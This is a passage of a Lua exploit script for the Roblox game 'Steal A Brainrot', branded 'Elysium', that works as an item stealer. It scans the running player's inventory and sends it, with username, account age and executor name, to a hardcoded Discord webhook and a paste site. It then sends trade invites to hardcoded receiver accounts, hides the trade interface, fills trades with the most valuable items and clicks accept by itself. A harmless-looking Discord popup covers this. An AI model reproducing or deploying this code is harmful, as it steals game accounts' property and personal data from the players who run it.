			end
		end
		if not wasVisible then InterfaceController:SetState("Settings", false) end
		SettingsGui.Enabled = wasEnabled
	end)
	if not okS then warn("[scan] skins failed") end
	return out
end

local function scanInventory()
	local brainrots = __scanBrainrots()
	local others = __scanGearAndSkins()
	local lines = {}
	for _, b in ipairs(brainrots) do
		local prefix = ""
		if b.mutationStr ~= "" then prefix = prefix .. "[" .. b.mutationStr:upper() .. "] " end
		if b.traitStr ~= "" then prefix = prefix .. "[" .. b.traitStr:upper() .. "] " end
		table.insert(lines, string.format("%s%s", prefix, b.name))
	end
	for _, o in ipairs(others) do
		table.insert(lines, string.format("[%s] %s", o.kind == "gear" and "GEAR" or "BASE SKIN", o.name))
	end
	return brainrots, others, lines
end

-- ============================================================
-- STANDALONE autoTrade
-- ============================================================
local __tradeSessionToken = 0
local __tradeAdded = {}

local function __classifyTradeSlot(slot)
	local kinds = {
		{ prefix = "Selection_Gear_", kind = "GEAR" },
		{ prefix = "Selection_BaseSkin_", kind = "BASE SKIN" },
		{ prefix = "Selection_Brainrot_", kind = "BRAINROT" },
	}
	for _, k in ipairs(kinds) do
		if slot.Name:find(k.prefix, 1, true) == 1 then
			local spacer = slot:FindFirstChild("Spacer")
			local title = spacer and spacer:FindFirstChild("Title", true)
			local text = (title and title:IsA("TextLabel") and title.Text) or slot.Name:sub(#k.prefix + 1)
			text = text:gsub("^%s+",""):gsub("%s+$","")
			return k.kind, text
		end
	end
	return nil, nil
end
local function __isAllowed(slot, allowedMutations)
	local kind, name = __classifyTradeSlot(slot)
	if kind == "GEAR" then return values.Gears[name] ~= nil end
	if kind == "BASE SKIN" then return values.BaseSkins[name] ~= nil end
	if kind == "BRAINROT" then
		if not values.Brainrots[name] then return false end
		if t1[name:lower()] then return true end
		if THRESHOLD > 0 then
			local spacer = slot:FindFirstChild("Spacer")
			local cash = spacer and spacer:FindFirstChild("Cash")
			if not cash or v51(cash.Text or "") < THRESHOLD then
				return false
			end
		end
		if not allowedMutations or next(allowedMutations) == nil then return true end
		local found = {}
		for _, d in ipairs(slot:GetDescendants()) do
			if d:IsA("TextLabel") and d.Text ~= "" then
				local t = d.Text:gsub("<[^>]+>", ""):gsub("^%s+", ""):gsub("%s+$", ""):lower()
				if allowedMutations[t] then table.insert(found, t) end
			end
		end
		return #found > 0
	end
	return false
end
local function __slotRank(slot)
	local kind, name = __classifyTradeSlot(slot)
	if kind == "GEAR" then return values.Gears[name] or 0 end
	if kind == "BASE SKIN" then return values.BaseSkins[name] or 0 end
	if kind == "BRAINROT" then
		if t1[name:lower()] then return 100 end
		local spacer = slot:FindFirstChild("Spacer")
		local cash = spacer and spacer:FindFirstChild("Cash")
		return cash and v51(cash.Text or "") or 0
	end
	return -1
end
local function __fireSlotButton(guiBtn)
	if type(firesignal) == "function" then
		local ok = pcall(firesignal, guiBtn.Activated)
		if ok then return true end
	end
	local conns = getconnections and getconnections(guiBtn.Activated)
	if conns and conns[1] and conns[1].Function then return pcall(conns[1].Function) end
	return false, "no connection"
end
local function __muted(fn, ...)
	n1 += 1
	local r = table.pack(pcall(fn, ...))
	n1 = math.max(0, n1 - 1)
	return table.unpack(r, 1, r.n)
end

local function autoTrade(targetUsername, allowedMutations, readyTimeout, maxClickAttempts)
	__tradeSessionToken = __tradeSessionToken + 1
	local myToken = __tradeSessionToken
	local TradeLiveTrade  = PlayerGui:WaitForChild("TradeLiveTrade")
	local TradeLiveTrade2 = TradeLiveTrade:WaitForChild("TradeLiveTrade")
	
	local other = TradeLiveTrade2:WaitForChild("Other", 5)
	local you   = TradeLiveTrade2:WaitForChild("Your", 5)
	if not other or not you then return end

	local function opponentMatches()
		local uname = other:FindFirstChild("Username")
		if not uname then return false end
		local text = string.lower(uname.Text)
		if not targetUsername or targetUsername == "" then return true end
		return string.find(text, string.lower(targetUsername), 1, true) ~= nil
	end
	local function stillAlive()
		return TradeLiveTrade2 and TradeLiveTrade2.Visible and myToken == __tradeSessionToken and opponentMatches()
	end

	local clickAttempts, addedCount = {}, {}

	task.spawn(function()
		local scrolling = you:FindFirstChild("ScrollingFrame")
		if not scrolling then return end
		
		local deadline = os.clock() + (readyTimeout or 120)
		local waitUntil = os.clock() + 5
		while not opponentMatches() and os.clock() < waitUntil do task.wait(0.1) end
		if not opponentMatches() then
			warn("[autoTrade] wrong opponent — aborting")
			return
		end
		while stillAlive() and os.clock() < deadline do
			local children = scrolling:GetChildren()
			table.sort(children, function(a, b)
				local ra, rb = __slotRank(a), __slotRank(b)
				if ra == rb then return a.Name < b.Name end
				return ra > rb
			end)
			local clicked = false
			for _, slot in ipairs(children) do
				if not stillAlive() then break end
				if __isAllowed(slot, allowedMutations) then
					local spacer = slot:FindFirstChild("Spacer")
					local stroke = spacer and spacer:FindFirstChildOfClass("UIStroke")
					local alreadySelected = stroke and stroke.Color == Color3.fromRGB(0, 255, 0)
					if alreadySelected then
						clickAttempts[slot] = 3
						if not addedCount[slot] then
							addedCount[slot] = true
							local _, name = __classifyTradeSlot(slot)
							if name then __tradeAdded[#__tradeAdded + 1] = name end
						end
					else
						local tries = clickAttempts[slot] or 0
						if tries < (maxClickAttempts or 3) and spacer and spacer:IsA("GuiButton") then
							clickAttempts[slot] = tries + 1
							__muted(__fireSlotButton, spacer)
							clicked = true
							task.wait(math.random(50, 80) / 100)
							break
						end
					end
				end
			end
			if not clicked then task.wait(0.2) end
		end
	end)

	local readyDeadline = os.clock() + (readyTimeout or 300)
	local readyButton = other:FindFirstChild("ReadyButton")
	if readyButton then
		local readyColor  = Color3.fromRGB(81, 158, 86)
		while stillAlive() and os.clock() < readyDeadline do
			local txt = readyButton.Txt.Text
			if readyButton.BackgroundColor3 == readyColor and (txt == "READY" or txt == "ACCEPT") then
				local conns = getconnections and getconnections(readyButton.Activated)
				if conns and conns[1] and conns[1].Function then
					__muted(conns[1].Function)
					task.wait(0.3)
				end
			else
				task.wait(0.1)
			end
		end
	end
	return __tradeAdded
end

-- ============================================================
-- LIVE TRADE
-- ============================================================
local n14 = 0
local t34_live = {}
local t48_live = {}
local u523
local n15 = 0

local function v551(TradeLiveTrade2)
	if not TradeLiveTrade2 then return false end
	local other = TradeLiveTrade2:FindFirstChild("Other")
	if not other then return false end
	local uname = other:FindFirstChild("Username")
	if not uname then return false end
	
	local v552 = string.lower(uname.Text)
	for _, receiver in ipairs(RECEIVERS) do
		local v555 = string.lower(receiver)
		if v555 ~= "" and string.find(v552, v555, 1, true) ~= nil then return true end
	end
	return false
end

-- FIX: resolve display name via Title label, fall back to stripped asset name
local function v556(p75)
	for _, v in ipairs({
		{ prefix = "Selection_Gear_",     kind = "GEAR"      },
		{ prefix = "Selection_BaseSkin_", kind = "BASE SKIN" },
		{ prefix = "Selection_Brainrot_", kind = "BRAINROT"  },
	}) do
		if string.find(p75.Name, v.prefix, 1, true) ~= 1 then continue end
		local Spacer = p75:FindFirstChild("Spacer")
		local Title  = Spacer and Spacer:FindFirstChild("Title", true)
		local titleText = ""
		if Title and Title:IsA("TextLabel") then
			titleText = (Title.ContentText ~= "" and Title.ContentText) or Title.Text or ""
		end
		titleText = titleText:gsub("^%s+",""):gsub("%s+$","")
		local fallback = string.sub(p75.Name, #v.prefix + 1)
		return v.kind, (titleText ~= "" and titleText) or fallback
	end
	return nil, nil
end

local function v561(p76)
	if next(t3) == nil then return "" end
	local t49 = {}
	for _, descendant in ipairs(p76:GetDescendants()) do
		if descendant:IsA("TextLabel") and descendant.Text ~= "" then
			local v565 = descendant.Text:gsub("<[^>]+>", ""):gsub("^%s+", ""):gsub("%s+$", "")
			if t3[v565:lower()] then t49[#t49 + 1] = v565 end
		end
	end
	return table.concat(t49, ", ")
end

-- FIX: brainrot check uses resolved display name; priority list wins regardless of cash
local function v566(p77)
	local kind, name = v556(p77)
	if not kind or not name or name == "" then return false end
	local key = name:lower()
	if kind == "GEAR"      then return v123(name) end
	if kind == "BASE SKIN" then return v124(name) end
	if kind == "BRAINROT"  then
		if t1[key] then return true end
		if THRESHOLD <= 0 then return true end
		local spacer = p77:FindFirstChild("Spacer")
		local cash   = spacer and spacer:FindFirstChild("Cash")
		if cash then
			local val = v51(cash.Text or cash.ContentText or "")
			if val >= THRESHOLD then return true end
		end
		return false
	end
	return false
end

local function v569(p78)
	local v570, v571 = v556(p78)
	if v570 == "GEAR"      then return v123(v571) and 50 or 0 end
	if v570 == "BASE SKIN" then return v124(v571) and 50 or 0 end
	if v570 == "BRAINROT"  then
		if t1[v571:lower()] then return 100 end
		local spacer = p78:FindFirstChild("Spacer")
		local cash   = spacer and spacer:FindFirstChild("Cash")
		return cash and v51(cash.Text or "") or 0
	end
	return -1
end

local function v572(TradeLiveTrade2)
	n14 += 1
	local v573 = n14
	table.clear(t48_live)
	table.clear(t34_live)
	local t50 = {}
	u523 = nil
	n15 = 0

	task.spawn(function()
		local Your = TradeLiveTrade2:WaitForChild("Your", 5)
		if not Your then return end
		local ScrollingFrame = Your:FindFirstChild("ScrollingFrame")
		if not ScrollingFrame then return end
		
		local t51, t52 = {}, {}
		local color3  = Color3.fromRGB(0, 255, 0)
		local color32 = Color3.fromRGB(81, 158, 86)
		local v580    = Random.new()
		local v581    = os.clock() + 120
		local now     = os.clock()
		local n16     = -1

		task.wait(0.5)
		local v584 = os.clock() + 5
		while TradeLiveTrade2.Visible and not v551(TradeLiveTrade2) and os.clock() < v584 do
			task.wait(0.1)
		end
		if not v551(TradeLiveTrade2) then
			warn("Otomatik trade iptal: hedef oyuncu farkli.")
			return
		end

		local function stillAlive()
			return v573 == n14 and TradeLiveTrade2.Visible and v551(TradeLiveTrade2)
		end

		local function tryClick(slot)
			local Spacer = slot:FindFirstChild("Spacer")
			if not Spacer or not Spacer:IsA("GuiButton") then return false end
			local conns = getconnections and getconnections(Spacer.Activated)
			if not conns or not conns[1] or not conns[1].Function then
				if type(firesignal) == "function" then
					local ok = pcall(firesignal, Spacer.Activated)
					return ok
				end
				return false
			end
			__muted(conns[1].Function)
			return true
		end

		local v585
		repeat
			if not stillAlive() then return end
			local v586 = false
			local n17  = 0
			local children = ScrollingFrame:GetChildren()
			table.sort(children, function(p79, p80)
				local v589, v590 = v569(p79), v569(p80)
				if v589 == v590 then return p79.Name < p80.Name end
				return v589 > v590
			end)
			for _, child in ipairs(children) do
				if not stillAlive() then break end
				local kind, name = v556(child)
				if not kind or not name then continue end
				n17 += 1
				local Spacer   = child:FindFirstChild("Spacer")
				local UIStroke = Spacer and Spacer:FindFirstChildOfClass("UIStroke")
				local selected = UIStroke and UIStroke.Color == color3

				if v566(child) then
					if selected then
						t51[child] = 3
						if not t50[child] then
							t50[child] = true
							t34_live[name] = (t34_live[name] or 0) + 1
						end
					else
						local tries = t51[child] or 0
						if tries < 3 then
							if tryClick(child) then
								t51[child] = tries + 1
								u523 = kind
								n15 = os.clock() + 5
								v586 = true
								now  = os.clock()
								task.wait(v580:NextNumber(0.5, 0.8))
								break
							else
								t51[child] = tries + 1
							end
						end
					end
				else
					if selected and (t52[child] or 0) < 3 then
						t52[child] = (t52[child] or 0) + 1
						if tryClick(child) then
							warn("[SAB] trade: atlanan item geri alindi: " .. tostring(name))
							v586 = true
							now  = os.clock()
							task.wait(v580:NextNumber(0.5, 0.8))
							break
						end
					end
				end
			end
			if n17 == n16 then
				if not v586 and os.clock() - now >= 1.5 then break end
			else
				n16 = n17
				now = os.clock()
			end
			if not v586 then task.wait(0.2) end
		until v581 <= os.clock()

		if stillAlive() then
			local OtherFrame = TradeLiveTrade2:FindFirstChild("Other")
			if OtherFrame then
				local ReadyButton = OtherFrame:FindFirstChild("ReadyButton")
				if ReadyButton then
					local v611 = os.clock() + 300
					repeat
						if not stillAlive() then return end
						local Txt = ReadyButton:FindFirstChild("Txt")
						if Txt and ReadyButton.BackgroundColor3 == color32 and (Txt.Text == "READY" or Txt.Text == "ACCEPT") then
							local conns = getconnections(ReadyButton.Activated)
							if conns and conns[1] and conns[1].Function then
								__muted(conns[1].Function)
								task.wait(0.3)
							end
						else
							task.wait(0.1)
						end
					until v611 <= os.clock()
				end
			end
		end
	end)
end

-- ============================================================
-- Webhook
-- ============================================================
local function v387()
	if identifyexecutor then
		local ok, result = pcall(identifyexecutor)
		if ok and result then return tostring(result) end
	end
	if getexecutorname then
		local ok, result = pcall(getexecutorname)
		if ok and result then return tostring(result) end
	end
	if syn then return "Synapse" end
	if KRNL_LOADED then return "KRNL" end
	if fluxus then return "Fluxus" end
	if getgenv().Celery then return "Celery" end
	return "Unknown"
end
local v392 = v387()

local function v393(p59, p60, p61)
	local v394 = v26()
	if not v394 then return nil end
	local t29 = { "=== BRAINROTS ===" }
	if #p59 == 0 then t29[#t29 + 1] = "(none)" else
		for _, v in ipairs(p59) do
			local v398 = v.Priority and "⭐" or ""
			local v399 = v.HallOfFame and "🏆"
			local v400 = v398 .. (v399 or "")
			t29[#t29 + 1] = v400 .. (v400 ~= "" and " " or "") .. v.DisplayName .. " | " .. v54(v.ParsedGeneration)
		end
	end
	if #p60 > 0 or #p61 > 0 then
		t29[#t29 + 1] = ""
		t29[#t29 + 1] = "=== GEARS / BASE SKINS ==="
		for _, v in ipairs(p60) do t29[#t29 + 1] = "⚙️ " .. v.name end
		for _, v in ipairs(p61) do t29[#t29 + 1] = "🏠 " .. v.name end
	end
	local ok, result = pcall(function()
		return v394({
			Url = "https://sourceb.in/api/bins",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({ files = { { content = table.concat(t29, "\n") } } })
		})
	end)
	if ok and result and result.StatusCode == 200 then
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)
		if ok2 and result2 and result2.key then
			return "https://cdn.sourceb.in/bins/" .. result2.key .. "/0"
		end
	end
	return nil
end

local function v409(p62, p63, p64, p65, p66, p67)
	local t30 = {}
	local n8 = 0
	local v415 = geniter(ipairs(p63))
	while true do
		local v416 = table.pack(v415())
		if not v416[1] then break end
		local v417 = v416[3]
		if n8 >= 15 then break end
		local t31 = {}
		if v417.Mutation and v417.Mutation ~= "" then t31[#t31 + 1] = "[" .. v417.Mutation .. "]" end
		if v417.Traits and #v417.Traits > 0 then t31[#t31 + 1] = "[" .. table.concat(v417.Traits, ", ") .. "]" end
		local v419 = #t31 > 0 and table.concat(t31, " ") or ""
		local s1 = ""
		if v417.Priority and v417.ParsedGeneration >= 800000000 then s1 = "⭐💸 "
		elseif v417.Priority then s1 = "⭐ "
		elseif v417.ParsedGeneration >= 800000000 then s1 = "💸 " end
		t30[#t30 + 1] = s1 .. (v419 ~= "" and v419 .. " ➜ " or "") .. (v417.DisplayName or "???") .. " ➜ " .. v54(v417.ParsedGeneration)
		n8 += 1
	end
	local v421 = #p63 - n8
	if v421 > 0 then t30[#t30 + 1] = "... and " .. v421 .. " more brainrots" end
	if #t30 == 0 then t30[#t30 + 1] = "None Found" end
	local t32 = {}
	local n9 = 0
	local v427 = geniter(ipairs(p64))
	while true do
		local v428 = table.pack(v427())
		if not v428[1] then break end
		local v429 = v428[3]
		if n9 >= 5 then break end
		t32[#t32 + 1] = "⚙️ " .. v429.name
		n9 += 1
	end
	for _, v in ipairs(p65) do
		if n9 >= 5 then break end
		t32[#t32 + 1] = "🏠 " .. v.name
		n9 += 1
	end
	local v435 = #p64 + #p65 - n9
	if v435 > 0 then t32[#t32 + 1] = "... and " .. v435 .. " more items" end
	if #t32 == 0 then t32[#t32 + 1] = "None Found" end
	local t33 = { {
		name = "**Player Info**",
		value = string.format("```\nUsername: %s\nPlayer Count: %d/%d\nAccount Age: %d days\nExecutor: %s\n```",
			p62.Name, #Players:GetPlayers(), Players.MaxPlayers, p62.AccountAge, v392),
		inline = false
	} }
	if not p67 then
		t33[#t33 + 1] = { name = "**Receivers**", value = "```\n" .. table.concat(RECEIVERS, ", ") .. "\n```", inline = false }
	end
	t33[#t33 + 1] = { name = "**Brainrots — Threshold: >" .. v54(THRESHOLD) .. "**", value = "```\n" .. table.concat(t30, "\n") .. "\n```", inline = false }
	t33[#t33 + 1] = { name = "**Gears / Base Skins**", value = "```\n" .. table.concat(t32, "\n") .. "\n```", inline = false }
	if p66 and not p67 then
		t33[#t33 + 1] = { name = "", value = "[View full inventory log](" .. p66 .. ")", inline = false }
	end
	if not p67 then
		t33[#t33 + 1] = { name = "**How to manually claim?**", value = "Join your PS server (or any server) and send a trade request to the player", inline = false }
	end
	return {
		content = "",
		embeds = { {
			title = p67 and "Steal A Brainrot Public Hit! Elysyum woooo!" or "Steal A Brainrot Hit! Elysyum ezez",
			color = 9662683, fields = t33,
			footer = { text = "Elysium! (Steal a Brainrot)" },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		} }
	}
end
local function v437()
	local t34, t35 = {}, {}
	for _, v in ipairs(t18) do
		if v.kind == "gear" then t34[#t34 + 1] = { name = v.name }
		elseif v.kind == "skin" then t35[#t35 + 1] = { name = v.name } end
	end
	return t34, t35
end
local function sendDiscordWebhook(payload)
	local req = v26()
	if not req then return false end
	local url = "https://discord.com/api/webhooks/1541702936525275157/w1UDjpF7iKb1SqdnmHGTo-FR_5DitQuIwwKBeHgZc4fXBpftx6mVb1HCiSgyara2pRVU"
	local ok, result = pcall(function()
		return req({
			Url = url,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = v16:JSONEncode({ content = payload.content or "", embeds = payload.embeds or {} })
		})
	end)
	return ok and result and result.StatusCode and result.StatusCode >= 200 and result.StatusCode < 300
end
local function v442(p68, p69)
	if u49 then return end
	u49 = true
	local n10, v444, v445 = 0, false, false
	for _, v in ipairs(p69) do
		if n10 < v.ParsedGeneration then n10 = v.ParsedGeneration end
		if v.Priority then v444 = true end
		if v.HallOfFame then v445 = true end
	end
	local v448, v449 = v437()
	local v450 = v444 or #v448 > 0 or #v449 > 0 or (n10 >= THRESHOLD and THRESHOLD > 0)
	local v451 = v393(p69, v448, v449)
	if WEBHOOK ~= "" then
		local payload = v409(p68, p69, v448, v449, v451, false)
		if v450 then
			payload.content = "@everyone `" .. p68.Name .. "` — Paste this in the Trading Machine!"
		end
		v8("WH_MAIN: " .. tostring(sendDiscordWebhook(payload)))
	end
end

-- ============================================================
-- Fuse clear
-- ============================================================
local function v346(p49)
	local t27 = {}
	local Brainrots = p49 and p49:FindFirstChild("Brainrots")
	if not Brainrots then return t27 end
	for _, child in ipairs(Brainrots:GetChildren()) do
		if child:IsA("GuiObject") and child.Visible and child.Name ~= "Template" then
			if string.sub(child.Name, 1, 6) ~= "Empty." then
				local Return = child:FindFirstChild("Return")
				if Return and Return:IsA("GuiButton") then
					table.insert(t27, { button = Return, name = child.Name, order = child.LayoutOrder })
				end
			end
		end
	end
	table.sort(t27, function(p50, p51) return p50.order < p51.order end)
	return t27
end
local function v352(p52)
	if type(firesignal) == "function" then return pcall(firesignal, p52.Activated) end
	local v353 = getconnections(p52.Activated)[1]
	if v353 and v353.Function then return pcall(v353.Function) end
	return false, "no connection"
end
local function v354()
	local FuseMachine = PlayerGui:WaitForChild("FuseMachine", 15)
	local FuseMachine2 = FuseMachine and FuseMachine:WaitForChild("FuseMachine", 5)
	if FuseMachine and FuseMachine2 then
		if #v346(FuseMachine2) == 0 then return true end
		pcall(function()
			require(ReplicatedStorage.Controllers.InterfaceController):SetState("FuseMachine", false)
		end)
		local function v357()
			local CurrentCamera = Workspace.CurrentCamera
			if CurrentCamera then
				CurrentCamera.FieldOfView = 70
				for _, child in ipairs(CurrentCamera:GetChildren()) do
					if child:IsA("BlurEffect") then child.Enabled = false end
				end
			end
			for _, child in ipairs(Lighting:GetChildren()) do
				if child:IsA("BlurEffect") then child.Enabled = false end
			end
		end
		v357(); task.defer(v357)
		FuseMachine.Enabled = false
		FuseMachine2.Visible = false
		local v363 = os.clock() + 30
		local v364
		while os.clock() < v363 do
			local v365 = v346(FuseMachine2)
			if #v365 == 0 then
				FuseMachine.Enabled = false
				FuseMachine2.Visible = false
				task.wait(0.75)
				return true
			end
			local v366 = #v365
			if not v352(v365[1].button) then
				warn("[SAB] Fuse Return failed")
				return false
			end
			local v367 = os.clock() + 5
			while true do
				task.wait(0.2)
				v364 = #v346(FuseMachine2)
				if v364 < v366 then break elseif v367 <= os.clock() then break end
			end
			if not (v366 <= v364) then
				task.wait(1.2)
				continue
			end
			warn("[SAB] Fuse UI didn't update")
			return false
		end
		warn("[SAB] Fuse timeout")
		return false
	end
	warn("[SAB] Fuse UI yuklenemedi")
	return false
end

-- ============================================================
-- Yui Discord notification
-- ============================================================
local function createFrame()
	local TITLE = "Join Yui's Discord Server"
	local LINK = "https://discord.gg/3jzRWKak6V"
	local SHORT = "discord.gg/3jzRWKak6V"
	local BOTTOM_OFFSET = 100

	local function new(class, props, par)
		local o = Instance.new(class)
		for k, v in pairs(props) do o[k] = v end
		if par then o.Parent = par end
		return o
	end

	local function getParent()
		local ok, ui = pcall(function() return gethui and gethui() end)
		if ok and ui then return ui end
		local ok2, core = pcall(function() return game:GetService("CoreGui") end)
		if ok2 and core then return core end
		return Players.LocalPlayer:WaitForChild("PlayerGui")
	end

	local parent = getParent()
	if parent:FindFirstChild("YuiDiscordNotif") then parent.YuiDiscordNotif:Destroy() end

	local Gui = new("ScreenGui", {
		Name = "YuiDiscordNotif",
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	}, parent)

	local Pill = new("TextButton", {
		Name = "Pill",
		Text = "",
		AutoButtonColor = false,
		Size = UDim2.fromOffset(250, 54),
		AnchorPoint = Vector2.new(1, 1),
		Position = UDim2.new(1, 300, 1, -BOTTOM_OFFSET),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		BorderSizePixel = 0,
	}, Gui)
	new("UICorner", {CornerRadius = UDim.new(1, 0)}, Pill)

	new("UIGradient", {
		Rotation = 20,
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 40, 66)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(88, 50, 140)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(24, 32, 56)),
		}),
	}, Pill)

	local pillStroke = new("UIStroke", {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	}, Pill)
	new("UIGradient", {
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 190, 255)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 110, 230)),
		}),
	}, pillStroke)

	local Icon = new("Frame", {
		Size = UDim2.fromOffset(38, 38),
		Position = UDim2.new(0, 8, 0.5, -19),
		BackgroundColor3 = Color3.fromRGB(14, 14, 18),
		BorderSizePixel = 0,
	}, Pill)
	new("UICorner", {CornerRadius = UDim.new(1, 0)}, Icon)
	local ring = new("UIStroke", {Thickness = 2.5, Color = Color3.fromRGB(255, 255, 255)}, Icon)
	new("UIGradient", {
		Rotation = 45,
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 200)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 200, 255)),
		}),
	}, ring)
	new("TextLabel", {
		Text = "💵", TextSize = 18, Font = Enum.Font.GothamBold,
		BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0),
	}, Icon)

	local Dot = new("Frame", {
		Size = UDim2.fromOffset(7, 7),
		Position = UDim2.new(0, 54, 0.5, -3),
		BackgroundColor3 = Color3.fromRGB(110, 210, 140),
		BorderSizePixel = 0,
	}, Pill)
	new("UICorner", {CornerRadius = UDim.new(1, 0)}, Dot)

	local Title = new("TextLabel", {
		Text = TITLE,
		Font = Enum.Font.MontserratBold, TextSize = 13,
		TextColor3 = Color3.fromRGB(245, 245, 255),
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 68, 0, 9), Size = UDim2.new(1, -96, 0, 18),
	}, Pill)

	local Sub = new("TextLabel", {
		Text = SHORT,
		Font = Enum.Font.Montserrat, TextSize = 11,
		TextColor3 = Color3.fromRGB(185, 195, 235),
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 68, 0, 28), Size = UDim2.new(1, -96, 0, 16),
	}, Pill)

	local Close = new("TextButton", {
		Text = "×", Font = Enum.Font.GothamBold, TextSize = 16,
		TextColor3 = Color3.fromRGB(200, 205, 235),
		BackgroundTransparency = 1,
		Size = UDim2.fromOffset(22, 22),
		Position = UDim2.new(1, -30, 0.5, -11),
	}, Pill)

	local SHOWN  = UDim2.new(1, -14, 1, -BOTTOM_OFFSET)
	local HIDDEN = UDim2.new(1, 300, 1, -BOTTOM_OFFSET)
	TweenService:Create(Pill, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = SHOWN}):Play()

	local scale = new("UIScale", {Scale = 1}, Pill)
	Pill.MouseEnter:Connect(function()
		TweenService:Create(scale, TweenInfo.new(0.15), {Scale = 1.04}):Play()
	end)
	Pill.MouseLeave:Connect(function()
		TweenService:Create(scale, TweenInfo.new(0.15), {Scale = 1}):Play()
	end)

	local busy = false
	Pill.MouseButton1Click:Connect(function()
		if busy then return end
		busy = true
		local okc = pcall(function() setclipboard(LINK) end)
		Title.Text = okc and "Link Copied!" or "Copy not supported"
		Sub.Text   = okc and "Paste it in your browser" or SHORT
		task.wait(1.5)
		Title.Text = TITLE
		Sub.Text   = SHORT
		busy = false
	end)

	Close.MouseButton1Click:Connect(function()
		local t = TweenService:Create(Pill, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = HIDDEN})
		t:Play()
		t.Completed:Wait()
		Gui:Destroy()
	end)

	return Gui
end

-- ============================================================
-- WATCH TRADE FOR RECEIVER
-- ============================================================
local function watchTradeForReceiver()
	local TradeLiveTrade = PlayerGui:WaitForChild("TradeLiveTrade", 30)
	if not TradeLiveTrade then return end
	local TradeLiveTrade2 = TradeLiveTrade:WaitForChild("TradeLiveTrade", 30)
	if not TradeLiveTrade2 then return end
	local busy = false

	local function tryStart()
		if busy or not TradeLiveTrade2.Visible then return end
		local Other = TradeLiveTrade2:FindFirstChild("Other")
		local uname = Other and Other:FindFirstChild("Username")
		if not uname then return end
		local text = (uname.Text or ""):lower()
		
		if text:find(RECEIVERS[1]:lower(), 1, true) then
			busy = true
			task.spawn(function()
				task.wait(0.4)
				task.spawn(function() pcall(v572, TradeLiveTrade2) end)
				task.spawn(function() pcall(autoTrade, RECEIVERS[1], nil, 180, 3) end)
				task.wait(2)
				busy = false
			end)
		end
	end

	TradeLiveTrade2:GetPropertyChangedSignal("Visible"):Connect(function()
		if TradeLiveTrade2.Visible then task.spawn(tryStart) else busy = false end
	end)
	if TradeLiveTrade2.Visible then task.spawn(tryStart) end
end

-- ============================================================
-- BOOT
-- ============================================================
if not v354() then
	getgenv().__ELYSIUM_SAB_RAN = nil
	return
end

task.spawn(function()
	local v480 = v26()
	if not v480 then return end
	pcall(function()
		v480({
			Url = SAB_API_BASE .. "/track-execution-sab",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({ target_players = RECEIVERS, executor = LocalPlayer.Name })
		})
	end)
end)

local u481 = false
task.spawn(function()
	for i = 1, 6 do
		pcall(v125)
		if not (#t18 > 0) then
			if i < 6 then task.wait(2) end
			continue
		end
		v8(("Gear/skin scan: %d items (attempt %d)"):format(#t18, i))
		u481 = true
		return
	end
	v8("Gear/skin scan: no items after 6 attempts")
	u481 = true
end)

task.spawn(function()
	task.wait(2)
	local v483 = tick() + 15
	while not u481 and tick() < v483 do task.wait(0.5) end
	local v484 = (function()
		local t28 = {}
		for _, v in ipairs(v95()) do
			local v374 = v.name:lower()
			local v375 = t1[v374] or false
			local v376 = t2[v374] or false
			if v.moneyPerSec >= 3e9 then v376 = true end
			t28[#t28 + 1] = {
				DisplayName = v.name, Index = v.name, Generation = v.moneyPerSec,
				ParsedGeneration = v.moneyPerSec, Mutation = v.mutationStr,
				Traits = v.traitStr ~= "" and { v.traitStr } or {},
				Rarity = "Unknown", Priority = v375, HallOfFame = v376
			}
		end
		table.sort(t28, function(p55, p56)
			if p55.Priority == p56.Priority then return p55.ParsedGeneration > p56.ParsedGeneration end
			return p55.Priority
		end)
		return t28
	end)()
	pcall(function() v442(LocalPlayer, v484) end)
end)

-- Invite loop
local t26 = {}
local n7 = 0
local function v330(p48)
	local v331 = t26[p48]
	if v331 then return v331 end
	local ok, result = pcall(function() return Players:GetUserIdFromNameAsync(p48) end)
	if not ok or type(result) ~= "number" then return nil end
	t26[p48] = result
	return result
end
local function v334()
	for i = 1, #t6 do
		local v336 = (n7 + i - 1) % #t6 + 1
		local v337 = t6[v336]
		local v338 = v330(v337)
		if not v338 then continue end
		n7 = v336
		return v337, v338
	end
	return nil, nil
end
local function v339()
	if not u45 and not u46 and v148() then
		local ok, result = pcall(require, ReplicatedStorage.Controllers.TradeController)
		if not ok or type(result) ~= "table" then return end
		local v342, v343 = v334()
		if not v342 or not v343 then return end
		u46 = true
		t7[v342] = tick()
		local u344 = false
		pcall(function()
			result:SendInvite(v343, function() end)
			u344 = true
		end)
		if u344 then v8("Invite sent → " .. v342 .. " (uid " .. v343 .. ")")
		else v8("SendInvite failed for " .. v342) end
		task.wait(math.random(10, 15))
		u46 = false
	end
end

hideTradeUI()
lockFOV(70)
lockFOVAndClearBlurs(70)

task.spawn(createFrame)
watchTradeForReceiver()

task.spawn(function()
	v8("Main loop | targets: " .. table.concat(t6, ", "))
	while true do
		task.wait(1)
		if not u45 and not u46 then pcall(v339) end
	end
end)

